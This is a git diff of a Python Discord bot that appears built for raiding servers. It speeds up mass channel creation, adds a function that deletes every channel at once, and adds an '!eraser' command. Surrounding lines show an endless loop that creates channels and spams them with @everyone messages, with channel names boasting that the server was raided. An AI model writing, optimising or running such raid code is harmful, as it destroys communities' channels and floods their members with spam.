@@ -13,7 +13,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
-CREATE_INTERVAL = 0.05  # チャンネル作成間隔（秒）
+CREATE_INTERVAL = 0.001  # チャンネル作成間隔（秒）
 
 COMBINED_TEXT = (
     "@everyone\n"
@@ -61,6 +61,12 @@ async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
             pass
 
 
+async def delete_all_channels_fast(guild: discord.Guild):
+    """✅ 最速：全チャンネルを一括並列削除"""
+    tasks = [ch.delete() for ch in guild.channels]
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+
 async def infinite_create_and_spam(guild: discord.Guild):
     """無限チャンネル作成＋並行無限送信"""
     stop_flag.clear()
@@ -69,9 +75,8 @@ async def infinite_create_and_spam(guild: discord.Guild):
     except:
         pass
 
-    # 既存チャンネルを全削除
-    delete_tasks = [ch.delete() for ch in guild.channels]
-    await asyncio.gather(*delete_tasks, return_exceptions=True)
+    # ✅ !start の削除も最速版に置き換え
+    await delete_all_channels_fast(guild)
 
     counter = 1
     while not stop_flag.is_set():
@@ -118,6 +123,15 @@ async def stop(ctx):
     await asyncio.gather(*background_tasks, return_exceptions=True)
     background_tasks.clear()
     await ctx.send("🛑 停止信号を送信しました。全てのタスクは順次終了します")
+
+
+# ✅ 新規コマンド：!eraser
+@bot.command()
+async def eraser(ctx):
+    """✅ 全チャンネルを一括削除"""
+    await ctx.send("🗑️ 全チャンネルを削除中…")
+    await delete_all_channels_fast(ctx.guild)
+    await ctx.send("✅ 全チャンネル削除完了")
 
 
 @bot.command()
